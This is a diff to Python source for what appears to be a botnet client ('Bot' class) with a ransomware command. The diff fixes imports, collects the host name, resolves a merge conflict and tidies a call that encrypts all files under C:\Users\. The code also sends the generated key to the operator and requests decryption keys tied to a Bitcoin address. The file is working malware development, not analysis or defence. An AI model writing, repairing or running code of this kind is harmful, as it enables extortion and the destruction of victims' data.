@@ -5,7 +5,7 @@ from datetime import datetime
 import time
 import uuid
 import random
-import sockets
+import socket
 import requests
 import platform
 import os
@@ -19,7 +19,7 @@ class Bot(object):
         self.platform = platform.system()
         self.uid = "2315"
         self.username = self.curr_user()
-        self.hostname = "end again"
+        self.hostname = socket.gethostname()
         self.ransom = False
 
     def curr_user(self):
@@ -69,12 +69,8 @@ class Bot(object):
             if self.ransom:
                 got_key = self.request_key(btc_addr)
                 if got_key:
-<<<<<<< HEAD
+
                     ransomware.decrypt_all_dir(got_key)
-=======
-                    
-                    Ransomware.decrypt_all_dir(got_key)
->>>>>>> 4879ef1fc380a0529e8de9b0be636ffeb5848770
                     self.ransom = False
 
 
@@ -88,7 +84,7 @@ class Bot(object):
             elif cmdarr[0] == "ransomware":
                     key = ransomware.key_gen()
                     print("ransom with key " + str(key))
-                    #Ransomware.encrypt_all_dir("C:\\Users\\", key)
+                    #ransomware.encrypt_all_dir("C:\\Users\\", key)
                     self.send_key(str(key))
                     self.ransom = True
 
